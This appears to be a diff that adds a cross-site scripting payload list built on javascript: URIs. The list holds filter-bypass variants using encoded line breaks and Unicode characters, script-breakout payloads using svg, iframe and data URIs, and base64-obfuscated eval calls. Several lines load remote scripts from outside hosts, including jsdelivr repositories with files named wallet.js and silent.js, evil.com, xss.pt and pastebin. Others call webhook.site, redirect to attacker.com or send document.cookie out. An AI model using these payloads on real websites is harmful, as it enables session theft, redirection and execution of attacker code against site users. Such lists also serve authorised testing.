@@ -1,0 +1,58 @@
+javascript://%250aalert`1`
+javascript://%0d%0aalert`1`
+javascript://%0dalert`1`
+javascript://%0aalert`1`
+javascript://%09alert`1`
+javascript://%0Dalert(1)
+javascript://%0Aalert(1)
+javascript://%0D%0Aalert(1)
+javascript://%E2%80%A8alert(1)
+javascript://%E2%80%A9alert(1)
+javascript://%C2%A0alert(1)
+javascript://%E2%80%8Balert(1)
+javascript://%E2%80%8Ealert(1)
+javascript://%E2%80%8Falert(1)
+javascript://%EF%BB%BFalert(1)
+javascript://--><svg onload=confirm(document.domain)>
+javascript://--></script><svg onload=confirm(document.domain)>
+javascript://--></script><img src onerror=confirm(document.domain)>
+javascript://--></script><iframe srcdoc='<script>confirm(document.domain)</script>'>
+javascript://--></script><iframe src="data:text/html,<script>confirm(document.domain)</script>">
+javascript://--></script><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+javascript://--></script><iframe srcdoc="<script>confirm(document.domain)</script>">
+javascript://--></script><iframe srcdoc="<body onload=confirm(document.domain)>">
+javascript://--></script><iframe srcdoc="<script src=//cdn.jsdelivr.net/gh/SatoshiNakamato/corruption@main/wallet.js></script>">
+javascript://--></script><iframe srcdoc="<script src=//cdn.jsdelivr.net/gh/SatoshiNakamato/corruption@main/connect.js></script>">
+javascript://--></script><iframe srcdoc="<script src=//cdn.jsdelivr.net/gh/SatoshiNakamato/corruption@main/x.js></script>">
+javascript://--></script><iframe srcdoc="<script src=//cdn.jsdelivr.net/gh/SatoshiNakamato/corruption@main/silent.js></script>">
+javascript://--></script><svg onload=fetch('https://webhook.site/123')>
+javascript://--></script><svg onload=location='//attacker.com'>
+javascript://--></script><svg onload=eval(atob('YWxlcnQoMSk='))>
+javascript://--></script><img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+javascript://--></script><iframe srcdoc="<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>">
+javascript://--></script><iframe src="data:text/html,<script>eval(atob('YWxlcnQoMSk='))</script>">
+javascript://--></script><iframe src="data:text/html,<svg onload=confirm(1)>">
+javascript://--></script><iframe src="data:text/html,<img src onerror=confirm(1)>">
+javascript://--></script><svg><script>alert(1)</script>
+javascript://--></script><svg><a href="javascript:alert(1)">Click</a>
+javascript://--></script><svg><set attributeName="onload" to="alert(1)"/>
+javascript://--></script><svg><animate attributeName="onload" values="alert(1)"/>
+javascript://--></script><svg><foreignObject><body onload=alert(1)>
+javascript://--></script><svg><desc><![CDATA[</desc><script>alert(1)</script>]]>
+javascript://--></script><svg><title><![CDATA[</title><script>alert(1)</script>]]>
+javascript://--></script><script>alert(1)</script>
+javascript://--></script><script src="data:text/javascript;base64,YWxlcnQoMSk="></script>
+javascript://--></script><script src="data:text/javascript,alert(1)"></script>
+javascript://--></script><object data="javascript:alert(1)">
+javascript://--></script><embed src="javascript:alert(1)">
+javascript://--></script><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+javascript://--></script><svg onload="this.innerHTML='<img src onerror=alert(1)>'">
+javascript://--></script><svg onload="this.setAttribute('onload','alert(1)')">
+javascript://--></script><svg onload="document.write('<script>alert(1)<\/script>')">
+javascript://--></script><iframe onload="this.contentDocument.write('<script>alert(1)<\/script>')">
+javascript://--></script><iframe srcdoc="<script src=//xss.pt/a.js></script>">
+javascript://--></script><iframe srcdoc="<script src=https://jsdelivr.net/gh/attacker/script.js></script>">
+javascript://--></script><iframe srcdoc="<script src=https://evil.com/xss.js></script>">
+javascript://--></script><iframe srcdoc="<script src=https://pastebin.com/raw/abc></script>">
+javascript://--></script><svg onload=top.frames[0].location='https://attacker.com'>
+javascript://--></script><iframe srcdoc="<script>top.postMessage(document.cookie,'*')</script>">
